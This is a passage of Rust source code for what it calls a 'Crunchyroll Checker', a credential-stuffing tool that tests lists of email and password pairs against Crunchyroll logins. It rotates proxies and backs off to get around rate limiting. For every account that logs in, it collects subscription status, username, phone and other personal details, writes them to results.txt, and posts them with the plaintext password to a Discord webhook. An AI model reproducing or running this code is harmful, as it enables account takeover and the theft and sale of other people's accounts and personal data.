    axum::extract::State(state): axum::extract::State<AppState>,
) -> Json<bool> {
    // Reset the Crunchyroll builder to simulate a fresh start
    let mut builder = state.crunchy_builder.lock().unwrap();
    *builder = Crunchyroll::builder().locale(Locale::en_US);
    
    // Clear all session data
    *RATE_LIMIT_COUNT.lock().unwrap() = 0;
    *LAST_FAILED.lock().unwrap() = None;
    *PROXY_INDEX.lock().unwrap() = 0;
    *STOP_CHECKING.lock().unwrap() = false;
    
    // Clear environment variables that might affect requests
    std::env::remove_var("HTTP_PROXY");
    std::env::remove_var("HTTPS_PROXY");
    
    println!("{}🔄 Session reset successfully{}", CYAN, RESET);
    
    // Return success
    Json(true)
}

async fn check_account_internal(email: &str, password: &str, advanced: bool, use_proxy: bool, builder: &CrunchyrollBuilder) -> anyhow::Result<(bool, String)> {
    let attempts = if use_proxy { 4 } else { 2 };
    let mut last_error = None;
    
    for attempt in 0..attempts {
        if attempt > 0 {
            // Exponential backoff per attempt
            let delay = 1500 * (1 << (attempt - 1)) as u64; // 1.5s, 3s, 6s...
            sleep(Duration::from_millis(delay)).await;
        }
        
        // Rotate proxy on every attempt when enabled
        let proxy_url = if use_proxy { get_next_proxy() } else { None };
        
        if let Some(ref proxy) = proxy_url {
            std::env::set_var("HTTP_PROXY", proxy);
            std::env::set_var("HTTPS_PROXY", proxy);
        } else if attempt > 0 {
            std::env::remove_var("HTTP_PROXY");
            std::env::remove_var("HTTPS_PROXY");
        }
        
        // Pass the builder reference directly
        match try_login(email, password, advanced, builder).await {
            Ok(result) => {
                std::env::remove_var("HTTP_PROXY");
                std::env::remove_var("HTTPS_PROXY");
                return Ok(result);
            },
            Err(e) => {
                let err_str = e.to_string();
                if err_str.contains("429") || err_str.contains("Rate limit") {
                    // Increment rate limit counter and set a cooldown to stagger future checks
                    {
                        let mut count = RATE_LIMIT_COUNT.lock().unwrap();
                        *count += 1;
                    }
                    {
                        let mut cooldown = COOLDOWN_UNTIL.lock().unwrap();
                        *cooldown = Some(Instant::now() + Duration::from_secs(20));
                    }
                    // If proxies are enabled, try next proxy in subsequent attempts
                    if use_proxy && attempt < attempts - 1 {
                        std::env::remove_var("HTTP_PROXY");
                        std::env::remove_var("HTTPS_PROXY");
                        continue; // try next attempt with different proxy
                    } else {
                        std::env::remove_var("HTTP_PROXY");
                        std::env::remove_var("HTTPS_PROXY");
                        return Err(anyhow::anyhow!("Rate limit detected"));
                    }
                }
                
                last_error = Some(e);
                if attempt < attempts - 1 {
                    std::env::remove_var("HTTP_PROXY");
                    std::env::remove_var("HTTPS_PROXY");
                }
            }
        }
    }
    
    Err(last_error.unwrap_or_else(|| anyhow::anyhow!("Login failed")))
}

async fn try_login(email: &str, password: &str, advanced: bool, _builder: &CrunchyrollBuilder) -> anyhow::Result<(bool, String)> {
    // Create a new builder instead of trying to clone or use the reference
    let new_builder = Crunchyroll::builder().locale(Locale::en_US);
    let result = timeout(Duration::from_millis(8000), new_builder.login_with_credentials(email, password)).await;
    
    match result {
        Ok(Ok(crunchy)) => {
            let account = crunchy.account().await?;
            let is_premium = matches!(account.video_maturity_rating, MaturityRating::Mature);
            let subscription_type = if is_premium { "Premium" } else { "Free" };
            
            let account_details = if advanced {
                format!(
                    "{}:{}\nSubscription: {}\nEmail Verified: {}\nUsername: {}\nEmail: {}\nPhone: {}\nProfile Name: {}\nCreated: {}\nMaturity Rating: {:?}\nAccount ID: {}\nExternal ID: {}\nFull Debug Info:\n{:#?}\n",
                    email,
                    password,
                    subscription_type,
                    account.email_verified,
                    account.username,
                    account.email,
                    account.phone,
                    account.profile_name,
                    account.created,
                    account.video_maturity_rating,
                    account.account_id,
                    account.external_id,
                    account
                )
            } else {
                format!(
                    "{}:{}\nSubscription: {}\nEmail Verified: {}\nUsername: {}\nProfile Name: {}\nCreated: {}\nMaturity Rating: {:?}\n",
                    email,
                    password,
                    subscription_type,
                    account.email_verified,
                    account.username,
                    account.profile_name,
                    account.created,
                    account.video_maturity_rating
                )
            };
            
            VALID_ACCOUNTS.lock().unwrap().push(format!("{}:{}", email, password));
            
            if is_premium {
                println!("{}{}✓ VALID (PREMIUM){} - {} - Username: {}", BOLD, GREEN, RESET, email, account.username);
            } else {
                println!("{}{}✓ VALID{} - {} - Username: {}", BOLD, CYAN, RESET, email, account.username);
            }
            
            Ok((is_premium, account_details))
        }
        Ok(Err(e)) => {
            let err_str = format!("{:?}", e);
            if err_str.contains("429") || err_str.contains("Rate limit") {
                println!("{}{}⧗ RATE LIMITED{} - {}", BOLD, MAGENTA, RESET, email);
            } else {
                println!("{}{}✗ INVALID{} - {}", BOLD, RED, RESET, email);
            }
            Err(anyhow::anyhow!("{}", err_str))
        }
        Err(_) => {
            println!("{}{}⧗ TIMEOUT{} - {}", BOLD, YELLOW, RESET, email);
            Err(anyhow::anyhow!("Request timed out"))
        }
    }
}

fn save_account_to_file(account_details: &str) -> anyhow::Result<()> {
    let file = OpenOptions::new()
        .write(true)
        .append(true)
        .create(true)
        .open("results.txt")?;
    let mut writer = BufWriter::new(file);
    writeln!(writer, "====================")?;
    write!(writer, "{}", account_details)?;
    writeln!(writer, "====================\n")?;
    Ok(())
}

fn get_next_proxy() -> Option<String> {
    let proxies = PROXIES.lock().unwrap();
    if proxies.is_empty() {
        return None;
    }
    
    let mut index = PROXY_INDEX.lock().unwrap();
    let proxy = proxies[*index].clone();
    *index = (*index + 1) % proxies.len();
    
    Some(proxy)
}

async fn send_to_discord(email: &str, password: &str, is_premium: bool, details: &str) -> anyhow::Result<()> {
    let webhook_url = DISCORD_WEBHOOK.lock().unwrap().clone();
    
    if let Some(url) = webhook_url {
        let client = reqwest::Client::new();
        
        let subscription = if is_premium { "✨ Premium" } else { "Free" };
        let color = if is_premium { 0x00ff00 } else { 0xffaa00 };
        
        let mut fields = Vec::new();
        for line in details.lines() {
            if line.contains(':') && !line.contains("==") {
                let parts: Vec<&str> = line.splitn(2, ':').collect();
                if parts.len() == 2 {
                    fields.push(serde_json::json!({
                        "name": parts[0].trim(),
                        "value": parts[1].trim(),
                        "inline": true
                    }));
                }
            }
        }
        
        let payload = serde_json::json!({
            "username": "Polygon Checker",
            "avatar_url": "https://i.ibb.co/qMMJJdqD/polygon.png",
            "embeds": [{
                "title": "✅ Valid Crunchyroll Account Found!",
                "description": format!("**Account:** `{}:{}`\n**Subscription:** {}", email, password, subscription),
                "color": color,
                "fields": fields,
                "thumbnail": {
                    "url": "https://i.ibb.co/qMMJJdqD/polygon.png"
                },
                "footer": {
                    "text": "Crunchyroll Checker - Made by Polygon - https://discord.gg/BmPKXpbYHK "
                },
                "timestamp": chrono::Utc::now().to_rfc3339()
            }]
        });
        
        let _ = client.post(&url)
            .json(&payload)
            .send()
            .await;
    }
    
    Ok(())